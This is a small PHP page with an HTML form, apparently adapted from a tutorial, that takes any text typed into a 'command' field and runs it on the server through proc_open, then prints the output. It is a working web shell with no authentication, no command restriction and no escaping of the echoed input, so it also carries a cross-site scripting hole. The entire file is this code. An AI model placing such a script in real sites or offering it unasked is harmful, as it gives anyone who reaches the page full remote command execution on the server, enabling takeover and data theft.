<form name="signupform" method="post" action="run.php">
	<table align="left" valign="top" width="100%" border="0"><tbody>
	<tr>
		<td><font class="label2">Command:</font></td>
		<td>
			<input class="formtext2" type="text" name="command" size="100">
			<input class="formbuton" type="submit" value="OK">
		</td>
	</tr>
	</tbody></table>
</form>

<?
//http://php-html.net/tutorials/how-to-write-a-php-script-to-run-shell-commands-from-browser/
function cmd_exec($cmd, &$stdout, &$stderr)
{
   $outfile = tempnam(".", "cmd");
   $errfile = tempnam(".", "cmd");
   $descriptorspec = array(
       0 => array("pipe", "r"),
       1 => array("file", $outfile, "w"),
       2 => array("file", $errfile, "w")
   );
   $proc = proc_open($cmd, $descriptorspec, $pipes);

   if (!is_resource($proc)) return 255;

   fclose($pipes[0]);    //Don't really want to give any input

   $exit = proc_close($proc);
   $stdout = file($outfile);
   $stderr = file($errfile);

   unlink($outfile);
   unlink($errfile);
   return $exit;
}


if (isset($_POST['command']))
{
	echo 'Command: ' . $_POST['command'] . '<br>';
	$exit = cmd_exec($_POST['command'],$stdout, $stderr);

    //print the output
	foreach ($stdout as $line)
	{
		echo "$line<br>";
	}

    //in case there an error is returned
	foreach ($stderr as $line)
	{
		echo "$line<br>";
	}
}
?>
